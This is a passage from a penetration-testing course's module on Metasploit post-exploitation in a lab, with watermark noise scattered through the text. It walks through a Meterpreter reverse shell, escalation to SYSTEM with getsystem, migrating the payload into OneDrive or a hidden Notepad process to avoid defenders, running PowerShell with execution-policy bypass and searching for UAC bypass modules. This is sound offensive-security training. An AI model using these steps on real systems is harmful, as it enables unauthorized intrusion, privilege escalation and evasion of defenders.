Redirecting stageless connection from /tiUQIXcIFB-TCZIL8eIxGgBxevpyuKwxxXiCTUKLb with
UA 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12o.2; rv:97.0) Gecko/20100101 Firefox/97.0'
[*] https://192.168.119.4:443 handling request from 192.168.50.223; (UUID: vu4ouwcd)
Attaching orphaned/stageless session...
[*] Meterpreter session 8 opened (192.1n68.119.4:443 -> 127.0.0.1) at 2022-08-04
06:41:29 -0400
meterpreter > i
Listinzg 674 - Incoming reverse shell from met.exe
Now that we have an active Meterpreter session on a Windows target we can start exploring
post-exploitation commandDs and features.
The first post-exploitation command we use is idletime. It displays the time for which a user has
been idle. After obtaining basic information about the current user and operating system, this
should be one of our first commands as it indicates if the target machine is currently in use or
not.
meterpreter > idletime
User has been idle for: 9 mins 53 secs
Listing 675 - Display idle time from current user
The output states that the user hasn’t been interacting with the system for 9 minutes and 53
seconds, suggesting the user may have stepped away from their computer. If the result of the
idletime command indicates that the user is away, we can take this as an opportunity to execute
programs or commands which may display a command-line window such as CMD or PowerShell
for a brief moment.
For several post-exploitation features, we need administrative privileges to execute them.
Metasploit contains the command getsystem, which attempts to automatically elevate our
permissions to NT AUTHORITY\SYSTEM. It uses various techniques using named pipe
impersonation and token duplication. In the default settings, getsystem uses all available
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 668
Made in Morocco
Penetration Testing with Kali Linux
techniques (shown in the help menu) attempting to leverage SeImpersonatePrivilege990 and
SeDebugPrivilege.991
Before we execute getsystem, let’s start an interactive shell and confirm that our user has one of
those two privileges assigned.
meterpreter > shell
...
C:\Users\luiza> whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name Description State
============================= ===============================y========== ========
...
SeImpersonatePrivilege Impersonate a client after authentication Enabled
k
...
C:\Users\luiza> exit s
exit
Listing 676 - Display the assigned privileges to our user in an interactive shell
o
Listing 676 shows that the user luiza has SeImpersonatePrivilege assigned. Now, let’s use
getsystem to attempt to elevate our privileges.
n
meterpreter > getuid
Server username: ITWK01\luiza
i
z
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
D
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
Listing 677 - Elevate our privileges with getsystem
Listing 677 shows that getsystem successfully elevated our privileges to NT
AUTHORITY\SYSTEM by using Named Pipe Impersonation (PrintSpooler variant) as we did
manually in the Windows Privilege Escalation Module.
Another important post-exploitation feature is migrate. When we compromise a host, our
Meterpreter payload is executed inside the process of the application we attack or execute our
payload. If the victim closes that process, our access to the machine is closed as well. In addition,
depending on how the Windows binary file containing the Meterpreter payload is named, the
process name may be suspicious if a defender is searching through the process list. We can use
migrate to move the execution of our Meterpreter payload to a different process.
Let’s view all running processes by entering ps in the Meterpreter command prompt.
990 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-
settings/impersonate-a-client-after-authentication
991 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-
settings/debug-programs
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 669
Made in Morocco
Penetration Testing with Kali Linux
meterpreter > ps
Process List
============
PID PPID Name Arch Session User
Path
--- ---- ---- ---- ------- ----
----
2552 8500 met.exe x64 0 ITWK01\luiza
C:\Users\luiza\met.exe
...
8052 4892 OneDrive.exe x64 1 ITWK01\offsec
C:\Users\offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe
...
Listing 678 - Display list of running processes y
Listing 678 shows that the process met.exe has the process ID 2552. The name and path will
easily make the process stand out to a defender reviewing tkhe process list. The output shows
that offsec started a process related to OneDrive with process ID 8052. If our payload runs within
this process, it is far less likely to be detected by reviewinsg the process list.
We should note that we are only able to migrate into processes that execute at the same (or
o
lower) integrity and privilege level992 than that of our current process. In the context of this
example, we already elevated our privileges to NT AUTHORITY\SYSTEM so our choices are
plentiful. n
Let’s migrate our current process to OneDrive.exe of the user offsec by entering migrate and the
process ID we want to migrate to. i
z
meterpreter > migrate 8052
[*] Migrating from 2552 to 8052...
[*] Migration completed sDuccessfully.
meterpreter > ps
Process List
============
PID PPID Name Arch Session User Path
--- ---- ---- ---- ------- ---- ----
...
2440 668 svchost.exe
2472 668 svchost.exe
2496 668 svchost.exe
2568 668 svchost.exe
2624 668 spoolsv.exe
2660 668 svchost.exe
2784 668 svchost.exe
2928 668 svchost.exe
...
992 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 670
Made in Morocco
Penetration Testing with Kali Linux
Listing 679 - Migrate to explorer.exe
Listing 679 shows that we successfully migrated our process to the OneDrive process. When
reviewing the process list, we’ll find our original process, met.exe with ID 2552, does not exist
anymore. Furthermore, we’ll notice that the ps output contains less information than before. The
reason for this is that we are now running in the context of the process with the ID 8052 and
therefore, as user offsec.
meterpreter > getuid
Server username: ITWK01\offsec
Listing 680 - Command execution as user offsec instead of NT AUTHORITY\SYSTEM
Instead of migrating to an existing process or a situation in which we won’t find any suitable
processes to migrate to, we can use the execute Meterpreter command. This command provides
the ability to create a new process by specifying a command or program.
y
To demonstrate this, let’s start a hidden Notepad process and migrate to it as user offsec. For
this, we use execute with -H to create the process hidden from view and _notepad as argument
k
for -f__ to specify the command or program to run. Then, we migrate to the newly spawned
process.
s
meterpreter > execute -H -f notepad
Process 2720 created. o
meterpreter > migrate 2720
[*] Migrating from 8052 to 2720... n
[*] Migration completed successfully.
meterpreter > i
Listing 681z - Migrate to a newly spawned Notepad process
Listing 681 shows how we can migrate to the newly spawned Notepad process. Since we used
the option -H, the Notepad pDrocess was spawned without any visual representation. However, the
process is still listed in the process list of applications such as the task manager.
This concludes this section. We explored several post-exploitation features of Meterpreter. First,
we used idletime to check if the user is actively working on the target system or not. Next, we
elevated our privileges with the help of getsystem. Finally, we used migrate to move the execution
of our Meterpreter payload to a different process.
Meterpreter offers a variety of other interesting post-exploitation modules such
as hashdump, which dumps the contents of the SAM database or screenshare,
which displays the target machine’s desktop in real-time.
While these Meterpreter features are quite powerful, Metasploit contains numerous post-
exploitation modules that extend the basic post-exploitation features we explored in this section.
We’ll review and use some of them in the next section.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 671
Made in Morocco
Penetration Testing with Kali Linux
20.3.2 Post-Exploitation Modules
In addition to native commands and actions in the core functions of Meterpreter, there are several
post-exploitation modules we can deploy against an active session.
Sessions that were created through attack vectors such as the execution of a client-side attack
will likely provide us only with an unprivileged shell. But if the target user is a member of the local
administrators group, we can elevate our shell to a high integrity level if we can bypass User
Account Control (UAC).993
In the previous section, we migrated our Meterpreter shell to a OneDrive.exe process that is
running at (presumably) medium integrity. For this section, let’s repeat the steps from the
previous section and then bypass UAC with a Metasploit post-exploitation module to obtain a
session in the context of a high integrity level process.
y
As before, we connect to the bind shell on port 4444 on ITWK01, download and execute met.exe,
and enter getsystem to elevate our privileges. Then, we use ps to identify the process ID of
k
OneDrive.exe, and migrate to it.
meterpreter > getsystem s
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
o
meterpreter > ps
Process List
n
============
PID PPID Name Arch Session User
i
Path
z
--- ---- ---- ---- ------- ----
----
...
D
8044 3912 OneDrive.exe x64 1 ITWK01\offsec
C:\Users\offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe
...
meterpreter > migrate 8044
[*] Migrating from 9020 to 8044...
[*] Migration completed successfully.
meterpreter > getuid
Server username: ITWK01\offsec
Listing 682 - Migrate to OneDrive process of the user offsec
Listing 682 shows that we are now running in the context of offsec again. While this is an
administrative account, UAC prevents us from performing administrative operations as we
learned in previous Modules. Before we attempt to bypass UAC, let’s confirm that the current
process has the integrity level Medium.
993 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-
control/how-user-account-control-works
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 672
Made in Morocco
Penetration Testing with Kali Linux
To display the integrity level of a process, we can use tools such as Process Explorer994 or third-
party PowerShell modules such as NtObjectManager.995 Let’s assume the latter is already
installed on the system.
Once we import the module with Import-Module,996 we can use Get-NtTokenIntegrityLevel997 to
display the integrity level of the current process by retrieving and reviewing the assigned access
token.
meterpreter > shell
Process 6436 created.
Channel 1 created.
Microsoft Windows [Version 10.0.22000.795]
(c) Microsoft Corporation. All rights reserved.
C:\Windows\system32> powershell -ep bypass
y
powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
k
Install the latest PowerShell for new features and improvements!
https://aka.ms/PSWindows s
PS C:\Windows\system32> Import-Module NtObjectManager
o
Import-Module NtObjectManager
PS C:\Windows\system32> Get-NtTokenIntegrityLevel
n
Get-NtTokenIntegrityLevel
Medium
i
Listing 683 - Reviewing integrity level
z
Listing 683 shows that we are currently performing operations in the context of integrity level
Medium. D
Next, let’s background the currently active channel and session to search for and leverage UAC
post-exploitation modules.
PS C:\Windows\system32> ^Z
Background channel 1? [y/N] y
meterpreter > bg
[*] Backgrounding session 9...
Listing 684 - Background channel and session
Now let’s search for UAC bypass modules.
994 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer
995 (PowerShell Gallery, 2022), https://www.powershellgallery.com/packages/NtObjectManager/1.1.33
996 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/import-
module?view=powershell-7.2
997 (Github, 2021), https://github.com/googleprojectzero/sandbox-attacksurface-analysis-
tools/blob/main/NtObjectManager/NtTokenFunctions.ps1
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 673
Made in Morocco
Penetration Testing with Kali Linux
msf6 exploit(multi/handler) > search UAC
Matching Modules
================
# Name Disclosure Date Rank
Check Description
- ---- --------------- ----
----- -----------
- ---- --------------- ----
----- -----------
0 post/windows/manage/sticky_keys normal
No Sticky Keys Persistance Module
1 exploit/windows/local/cve_2022_26904_superprofile 2022-03-17
excellent Yes User Profile Arbitrary Junction Creation Local Privilege Elevation
2 exploit/windows/local/bypassuac_windows_store_filesys y 2019-08-22 manual
Yes Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe)
3 exploit/windows/local/bypassuac_windows_store_reg 2019-02-19 manual
k
Yes Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe) and Registry
...
11 exploit/windows/local/bypassuac_sdclt 2017-03-17
s
excellent Yes Windows Escalate UAC Protection Bypass (Via Shell Open Registry Key)
12 exploit/windows/local/bypassuac_silentcleanup 2019-02-24
excellent No Windows Escalate UAC Protecotion Bypass (Via SilentCleanup)
...
Listing 685 - Search for UAC bypass modules
n
The search yields quite a few results. One very effective UAC bypass on modern Windows
systems is exploit/windows/local/bypassuac_sdclt, which targets the Microsoft binary sdclt.exe.
This binary can be abused to bypassi UAC by spawning a process with integrity level High.998
z
To use the module, we’ll activate it and set the SESSION and LHOST options as shown in the
following listing. Setting the SESSION for post-exploitation modules allows us to directly execute
D
the exploit on the active session. Then, we can enter run to launch the module.